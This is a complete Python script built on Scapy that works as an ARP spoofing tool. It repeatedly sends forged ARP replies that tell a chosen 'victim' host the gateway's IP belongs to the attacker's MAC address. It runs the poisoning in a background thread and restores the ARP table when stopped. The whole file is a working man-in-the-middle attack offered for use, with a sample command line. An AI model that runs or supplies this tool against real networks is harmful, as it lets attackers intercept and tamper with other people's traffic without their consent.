#!/usr/bin/env python3

import sys
import time
import signal
import threading
from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr, conf

# Global variable to store the spoofer instance for signal handling
spoofer = None

class ARPSpoofer:
    def __init__(self, target_ip, spoof_ip, interface="eth0", interval=2.0):
        # Initialize the ARP spoofer with target and spoof IP addresses
        self.target_ip = target_ip      # The victim machine we're poisoning
        self.spoof_ip = spoof_ip        # The IP we're impersonating (usually gateway)
        self.interface = interface      # Network interface to use
        self.interval = interval        # How often to send spoofed packets (seconds)
        
        # MAC addresses will be populated later
        self.target_mac = None          # Victim's MAC address
        self.spoof_mac = None           # Real MAC of the IP we're spoofing
        self.attacker_mac = None        # Our own MAC address
        
        # Control flags for the spoofing thread
        self.running = False           # Flag to control the spoofing loop
        self.spoof_thread = None       # Thread that runs the spoofing

    def find_mac_addresses(self):
        """Resolve MAC addresses for target, spoof IP, and get our own MAC"""
        try:
            # Get the victim's MAC address using ARP lookup
            self.target_mac = getmacbyip(self.target_ip)
            if not self.target_mac:
                print(f"MAC address not found for {self.target_ip}")
                return False

            # Get the real MAC address of the IP we're pretending to be
            self.spoof_mac = getmacbyip(self.spoof_ip)
            if not self.spoof_mac:
                print(f"Mac address not found for {self.spoof_ip}")
                return False

            # Get our own MAC address from the network interface
            self.attacker_mac = get_if_hwaddr(self.interface)

            # Display network information for verification
            print(f"Network: {self.interface}")
            print(f"Target: {self.target_ip} -> {self.target_mac}")
            print(f"Spoofed IP: {self.spoof_ip} -> {self.spoof_mac}")
            print(f"Attacker MAC: {self.attacker_mac}")

            return True
        except Exception as error:
            print(f"Error looking up MAC {error}")
            return False

    def build_spoof_packet(self):
        """Create an ARP reply packet that lies about the spoofed IP's MAC address"""
        # Craft an Ethernet frame addressed to the victim
        # Combined with an ARP reply that claims the spoofed IP is at our MAC
        return Ether(dst=self.target_mac) / ARP(
            op=2,                      # ARP reply (not request)
            pdst=self.target_ip,       # Destination IP (victim)
            hwdst=self.target_mac,     # Destination MAC (victim)
            psrc=self.spoof_ip,        # Source IP we're impersonating
            hwsrc=self.attacker_mac    # Our MAC address (the lie)
        )

    def build_cleanup_packet(self):
        """Create an ARP packet to restore the correct MAC address mapping"""
        # Get the actual MAC address of the spoofed IP if not already known
        actual_spoof_mac = self.spoof_mac or getmacbyip(self.spoof_ip)
        
        # Craft a packet that tells the victim the truth about MAC addresses
        return Ether(dst=self.target_mac) / ARP(
            op=2,                      # ARP reply
            pdst=self.target_ip,       # Destination IP (victim)
            hwdst=self.target_mac,     # Destination MAC (victim)
            psrc=self.spoof_ip,        # Source IP (the one we spoofed)
            hwsrc=actual_spoof_mac     # Real MAC address (restoring truth)
        )

    def run_spoofing(self):
        """Continuously send spoofed ARP packets to maintain the poisoning"""
        packet = self.build_spoof_packet()
        print(f"ARP spoofing beginning, telling {self.target_ip} that {self.spoof_ip} is at {self.attacker_mac}")
        
        # Keep sending spoofed packets until told to stop
        while self.running:
            try:
                # Send the spoofed packet at layer 2 (Ethernet)
                sendp(packet, verbose=False, iface=self.interface)
                # Wait before sending the next spoofed packet
                time.sleep(self.interval)
            except Exception as error:
                print(f"Packet sending error: {error}")
                break

    def begin_attack(self):
        """Start the ARP spoofing attack in a separate thread"""
        # First, resolve all necessary MAC addresses
        if not self.find_mac_addresses():
            return False
        
        # Set running flag and start the spoofing thread
        self.running = True
        self.spoof_thread = threading.Thread(target=self.run_spoofing, daemon=True)
        self.spoof_thread.start()
        return True

    def cleanup_arp(self):
        """Send correct ARP packets to restore the victim's ARP table"""
        print("Cleaning up entries")
        try:
            # Build the restoration packet with correct information
            cleanup_packet = self.build_cleanup_packet()
            
            # Send multiple restoration packets to ensure the victim gets them
            for i in range(5):
                sendp(cleanup_packet, verbose=False, iface=self.interface)
                time.sleep(0.5)  # Small delay between packets
                
            print("ARP tables restored")
        except Exception as error:
            print(f"Cleanup failed: {error}")

    def end_attack(self):
        """Stop the spoofing attack and restore ARP tables"""
        # Signal the spoofing thread to stop
        if self.running:
            self.running = False
            # Wait for the thread to finish (with timeout)
            if self.spoof_thread:
                self.spoof_thread.join(timeout=3)
        
        # Restore the victim's ARP table
        self.cleanup_arp()

def handle_interrupt(signal_number, frame):
    """Handle Ctrl+C signal to gracefully stop the attack"""
    print("\nStopping Attack")
    if spoofer:
        spoofer.end_attack()
    sys.exit(0)

def show_help():
    """Display usage information"""
    print("ARP Spoofing Tool")
    print("Usage: sudo python3 arp_spoof.py <target_ip> <spoof_ip> [interface]")
    print("Example: sudo python3 arp_spoof.py 192.168.1.100 192.168.1.1 eth0")

if __name__ == "__main__":
    # Set up signal handler for graceful shutdown on Ctrl+C
    signal.signal(signal.SIGINT, handle_interrupt)
    
    # Check command line arguments
    if len(sys.argv) not in [3, 4]:
        show_help()
        sys.exit(1)

    # Parse command line arguments
    target = sys.argv[1]    # Victim IP address
    spoof = sys.argv[2]     # IP address to impersonate
    iface = sys.argv[3] if len(sys.argv) == 4 else "eth0"  # Network interface

    print("ARP Spoofing attack starting")

    # Create the ARP spoofer instance
    spoofer = ARPSpoofer(target, spoof, interface=iface)

    # Start the attack
    if spoofer.begin_attack():
        print("ARP Spoofing is active, to terminate press Ctrl+C")
        try:
            # Main loop - just sleep until interrupted
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            # Ctrl+C was pressed, will be handled by signal handler
            pass
        finally:
            # Ensure cleanup happens even if there's an error
            spoofer.end_attack()
    else:
        print("Unable to initiate ARP spoofing attack")
        sys.exit(1)
